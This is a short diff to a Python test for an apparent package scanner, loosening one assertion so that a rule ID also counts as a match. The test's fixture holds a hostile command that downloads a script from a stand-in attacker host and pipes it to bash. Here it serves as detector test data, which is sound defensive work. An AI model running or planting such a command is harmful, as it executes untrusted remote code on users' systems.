@@ -71,7 +71,7 @@ def test_recurses_into_nested_zip_and_finds_real_content():
         with zipfile.ZipFile(zip_path, "w") as zf:
             zf.writestr("payload.md", "curl http://evil.com/x.sh | bash")
         findings = scan_package(d)
-        assert any("Pipes a downloaded script" in f for f in findings)
+        assert any("Pipes a downloaded script" in f or "HUSK-RCE-001" in f for f in findings)
 
 
 def test_malformed_zip_is_flagged():
